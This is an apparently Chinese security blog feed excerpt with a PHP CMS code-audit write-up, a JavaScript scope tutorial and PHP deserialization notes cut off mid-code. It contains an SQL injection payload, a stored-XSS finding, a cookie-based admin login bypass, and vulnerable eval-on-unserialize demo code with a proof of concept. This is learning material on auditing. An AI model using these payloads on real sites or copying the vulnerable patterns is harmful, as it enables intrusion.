id=&quot;xx&quot;&gt;</span><br><span class="line">&lt;span&gt;&lt;input name=&quot;jz&quot; type=&quot;checkbox&quot; value=&quot;1&quot; checked=&quot;checked&quot;/&gt; 记住我的个人信息&lt;/span&gt;</span><br><span class="line">&lt;span&gt;&lt;input name=&quot;tz&quot; type=&quot;checkbox&quot; value=&quot;1&quot; checked=&quot;checked&quot;/&gt; 回复后邮件通知我&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;qcfd&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>这里发表评论提交到了submit.php这里跟进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span> <span class="string">'inc/conn.php'</span>;</span><br><span class="line">$type=addslashes($_GET[<span class="string">'type'</span>]);</span><br><span class="line">$name=$_POST[<span class="string">'name'</span>];</span><br><span class="line">$mail=$_POST[<span class="string">'mail'</span>];</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$content=$_POST[<span class="string">'content'</span>];</span><br><span class="line">$cid=$_POST[<span class="string">'cid'</span>];</span><br><span class="line">$ip=$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">$tz=$_POST[<span class="string">'tz'</span>];</span><br><span class="line"><span class="keyword">if</span> ($tz==<span class="string">""</span>)&#123;$tz=<span class="number">0</span>;&#125;</span><br><span class="line">$jz=$_POST[<span class="string">'jz'</span>];</span><br></pre></td></tr></table></figure><p>这里首先开启了session对传入type进行addslashes转义，后面对POST提交的name,mail,url 等一系列参数都没有任何过滤这里没有进行二次过滤可能存在存储型的xss</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/([/x81-/xfe][/x40-/xfe])/"</span>, $content, $match)) &#123;</span><br><span class="line">echo <span class="string">"&lt;Script language=JavaScript&gt;alert('亲，再说点别的了吧？');history.back();&lt;/Script&gt;"</span>;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对$content,$match采用了正则<code>([/x81-/xfe][/x40-/xfe])</code>是对GBK中文编码的匹配，如果评论中不包含中文字符则提示“亲，再说点别的了吧？</p><p>接着往下看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($url&lt;&gt;<span class="string">""</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (strstr($url, <span class="string">"http://"</span>))</span><br><span class="line">&#123;</span><br><span class="line">$url=$url;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$url=<span class="string">"http://"</span>.$url;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$content= addslashes(strip_tags($content));<span class="comment">//过滤HTML</span></span><br></pre></td></tr></table></figure><p>这里对url进行过滤，首先判断url是否为空，不为空则用strstr()找是否存在“http://”如果存在的话就在$url前面添加http://,最后对传进去的content进行addslashes，但是其他参数没有过滤，这里对其他参数进行xss发现成功弹窗存在存储型xss</p><p><img src="/images/xhcms/1576829110852.png" alt="1576829110852"></p><p>接着往下跟进</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM interaction WHERE( mail = '$mail')"</span>;</span><br><span class="line">$result = mysql_query($query) or die(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$tx = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span> (!mysql_num_rows($result))&#123;  </span><br><span class="line">$touxiang = mt_rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$touxiang = $tx[<span class="string">'touxiang'</span>];</span><br></pre></td></tr></table></figure><p>这里很明显的$mail存在注入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- POST</span><br><span class="line">111@qq.com&apos;) and updatexml(1,concat(0x7e,(select version()),0x73),1)#</span><br></pre></td></tr></table></figure><p>后面发现注入一大堆这里直接先看看后台有啥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">require</span> <span class="string">'../inc/conn.php'</span>;</span><br><span class="line">$login=$_POST[<span class="string">'login'</span>];</span><br><span class="line">$user=$_POST[<span class="string">'user'</span>];</span><br><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$checkbox=$_POST[<span class="string">'checkbox'</span>];</span><br><span class="line"><span class="keyword">if</span> ($login&lt;&gt;<span class="string">""</span>)&#123;</span><br><span class="line">$query = <span class="string">"SELECT * FROM manage WHERE user='$user'"</span>;</span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$users = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><h3 id="登录处绕过"><a href="#登录处绕过" class="headerlink" title="登录处绕过"></a>登录处绕过</h3><p>很明显的注入了这里发现这里暂时不看注入看看其他的在../inc/checklogin.php处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=$_COOKIE[<span class="string">'user'</span>];</span><br><span class="line"><span class="keyword">if</span> ($user==<span class="string">""</span>)&#123;</span><br><span class="line">header(<span class="string">"Location: ?r=login"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显可以存在绕过,这里如果$user为空就会重定向到login.php,假如user的值存在就可以绕过后台直接进入后台。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个cms对于入门真的是一个很好的入门点当然里面的漏洞远远不止这么一点还有一大堆注入，这里只是想对在审计的一些思路和流程过一遍，当然这样看的话很累，但是也能理解他的流程，也可以直接根据找危险函数进行查看然后再溯源。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为之前忙着公司的一些事情，一直没有完成自己的计划，今天有时间了打算写一下审计的过程，算是自己的代码审计的入坑，这里还是想读一下源码首先看一下该cms的目录结构，所以这里首先从入口文件进入index.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/xhcms/15
      
    
    </summary>
    
      <category term="代码审计" scheme="http://onekingcc.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈js里面的作用域与作用域链</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E6%B5%85%E8%B0%88js%E9%87%8C%E9%9D%A2%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F%E9%93%BE/"/>
    <id>http://onekingcc.github.io/2020/06/03/浅谈js里面的作用域与作用域链/</id>
    <published>2020-06-03T14:28:12.850Z</published>
    <updated>2019-08-11T14:59:24.680Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉JavaScript里面的有些东西有趣但是有时候又有点不理解，有时候只是简单的用一下今天看了一下手册发现自己理解的还是有些偏差所以将自己所理解的记录下来！<a id="more"></a></p><h3 id="什么是作用域"><a href="#什么是作用域" class="headerlink" title="什么是作用域"></a>什么是作用域</h3><p>我理解的就是在一定区域内起作用的区域。</p><h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>js的作用域是全局的，在代码的任何地方都有定义，都能使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> a =<span class="number">12</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(show());<span class="comment">//12</span></span><br></pre></td></tr></table></figure><p>这里的a加在了什么地方了呢，其实这个a是加在了全局对象window上面我们可以看一下是不是</p><p><img src="/images/zuoyongyu/1563280204559.png" alt="1563280204559"></p><p>这里可以看到返回了true，这里说明在声明局部变量时要使用var,否则这里的解释器会将该变量变为全局对象window的属性。</p><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>函数作用域说明只在函数内起作用</p><p><img src="/images/zuoyongyu/1563280978444.png" alt="1563280978444"></p><p>这里看到这里的<code>num</code>是not define，这里要注意一点的就是这里的变量作用域不同于java c++的编程语言，这里的<code>var</code>很容易造成误会，举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//10</span></span><br></pre></td></tr></table></figure><p><img src="/images/zuoyongyu/1563281510785.png" alt="1563281510785"></p><p>可以发现输出了10，num这个对象是在块级里面包裹的但是还是输出了10，这就说明跟传统的java ，C++在块级起作用是不一样的，如果我想要它在这个块级起作用该怎么做呢？</p><p><img src="/images/zuoyongyu/1563282145312.png" alt="1563282145312"></p><p>这里发现我们加了let让num起作用了，let是在Es6中只要用let所声明的变量，只在let命令所在的代码块有效。</p><h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><p>什么是作用域链呢？子级没有的去让父级去查找。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">111</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">    show1();</span><br><span class="line">&#125;<span class="function"><span class="keyword">function</span> <span class="title">show1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line">show();</span><br></pre></td></tr></table></figure><p>如果没有真正理解那句话很容易就会得10，看到父函数里面show1()的调用，然后子函数没有的就找父级，嗯没错啊10呢，但是结果是111</p><p><img src="/images/zuoyongyu/1563283414163.png" alt="1563283414163"></p><p>这里的父级跟在哪执行没有关系，而是根据它物理的位置有关系，什么意思看一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">111</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">show1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line">    show1();</span><br><span class="line">&#125;</span><br><span class="line">show();</span><br></pre></td></tr></table></figure><p><img src="/images/zuoyongyu/1563283840302.png" alt="1563283840302"></p><p>这里我们发现这时候就是我们得到想要的值，子函数没有的就在父函数里面找，这就是在函数里面嵌套的，所以为什么说跟它物理位置有关。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;感觉JavaScript里面的有些东西有趣但是有时候又有点不理解，有时候只是简单的用一下今天看了一下手册发现自己理解的还是有些偏差所以将自己所理解的记录下来！&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化学习笔记</title>
    <link href="http://onekingcc.github.io/2020/03/22/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://onekingcc.github.io/2020/03/22/PHP序列化学习/</id>
    <published>2020-03-21T16:00:00.000Z</published>
    <updated>2020-11-14T06:52:10.474Z</updated>
    
    <content type="html"><![CDATA[<p>serialize:serialize()返回的是字符串，方便存储和传递PHP的值。</p><p>unserialize:就是将已经序列化的字符串转化为php的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">done</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $test;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$name = <span class="keyword">new</span> A();</span><br><span class="line">$name-&gt;test=<span class="string">"onekingcc"</span>;</span><br><span class="line">$ser =  serialize($name);</span><br><span class="line"><span class="keyword">echo</span> $ser.<span class="string">"/n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">    O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">9</span>:<span class="string">"onekingcc"</span>;&#125;</span><br></pre></td></tr></table></figure><p>O:1代表object长度为1，A:1， A代表类名，对象的数量属性为1即类中变量的个数，s:4:”test”，s代表字符串，长度为4，字符串为test后面同理。基本就是类型：长度：值；这样一一对应</p><p>unserialize()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">done</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $test;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$name = <span class="keyword">new</span> A();</span><br><span class="line">$name-&gt;test=<span class="string">"onekingcc"</span>;</span><br><span class="line">$ser =  serialize($name);<span class="comment">//序列化</span></span><br><span class="line"><span class="keyword">echo</span> $ser.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$user = unserialize($ser);<span class="comment">//反序列化</span></span><br><span class="line">print_r($user-&gt;test);</span><br></pre></td></tr></table></figure><p>这里需要了解php里面的魔法函数看是如何调用的这里在先知找到了个列子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> $varr1=<span class="string">"abc"</span>;</span><br><span class="line"> <span class="keyword">public</span> $varr2=<span class="string">"123"</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"__construct&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"__destruct&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"__toString&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"__sleep&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'varr1'</span>,<span class="string">'varr2'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"__wakeup&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用构造__construct()方法，输出__construct</span></span><br><span class="line">$obj-&gt;echoP();   <span class="comment">//调用echoP()方法，输出"abc"</span></span><br><span class="line"><span class="keyword">echo</span> $obj;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line">$s =serialize($obj);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize($s);  <span class="comment">//$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct这里有点析构函数的感觉进行内存的释放</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/xulihua/1584695795382.png" alt="1584695795382"></p><p>对象一旦被创建就会调用constract()方法，当序列化对象时，在序列化对象之前是最先调用的它对象的成员方法，然后就是sleep()方法，当使用unserialize()恢复对象时，首先是将调用wakeup()魔术方法，然后被反序列化出来的对象会当成字符串然后继续调用  tosting()方法最后再调用destruction()方法如果当调用对象中的方法不存在就会调用call()方法，这中间自己也犯了迷糊tostring()这个函数如果遇到一个file_exits()这个函数他是首先会将转化为字符串然后就会调用_tostring()魔术方法。</p><h4 id="对象注入例子"><a href="#对象注入例子" class="headerlink" title="对象注入例子"></a>对象注入例子</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $test = <span class="string">'hello unserialize bug'</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// $val = new Example();</span></span><br><span class="line">    $val = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $user = unserialize($val);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们是通$_GET传入变量，等unserialize()结束后就会调用destructi()函数然后回显$test的值,所以我们可以构造palyoad构造我们想植入的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test = <span class="string">'onekingcc123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $obj = <span class="keyword">new</span> Example();</span><br><span class="line">    $val = serialize($obj);</span><br><span class="line">    <span class="keyword">echo</span> $val;<span class="comment">//O:7:"Example":1:&#123;s:4:"test";s:12:"onekingcc123";&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/xulihua/1584714293554.png" alt="1584714293554"></p><p>这样我们就覆盖了原来$test里面的值，这里有一点就是既这里是可控的那么就可以拼接序列化对象，就可以在构造一个魔术方法然后再去调用eval执行我们想要的语句poc如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test = <span class="string">"demo"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $test = $_POST[<span class="string">'test'</span>];</span><br><span class="line">    $len = strlen($test)+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    $poc = <span class="string">"O:7:/"</span>Example/<span class="string">":1:&#123;s:4:/"</span>test/<span class="string">";s:"</span>.$len<span class="string">":/"</span><span class="string">".$test."</span>;/<span class="string">";&#125;"</span>; <span class="comment">// 构造序列化对象</span></span><br><span class="line">    $test_unser = unserialize($poc); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/xulihua/1584779956546.png" alt="1584779956546"></p><p>这里之前都是属性为public的时候如果里面的成员变量时private，和protect还会是一样的嘛这里测试了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $val = <span class="string">"onekingcc123"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="keyword">new</span> A);</span><br></pre></td></tr></table></figure><p><img src="/images/xulihua/1584721288481.png" alt="1584721288481"></p><p>查资料发现会多了%00然后这里，在php版本小于5.6.25时当属性个数大于真实个数时候就会绕过wakup()魔术方法</p><h4 id="普通方法反序列化漏洞："><a href="#普通方法反序列化漏洞：" class="headerlink" title="普通方法反序列化漏洞："></a>普通方法反序列化漏洞：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x1();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"x1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class2  = <span class="keyword">new</span> maniac();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现这段代码unserialize()是$_GET[‘test’]过去，可控的，前面说过当使用unsserialize()反序列化对象时首先调用的是魔术方法wakeup(),反序列化出来的对象会当成字符串然后继续调用tostring()魔术方法，最后调用destruct()方法，这段代码中只存在destruct()魔术方法，所以这里会自动调用，进入action()普通的成员方法，所以就可以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 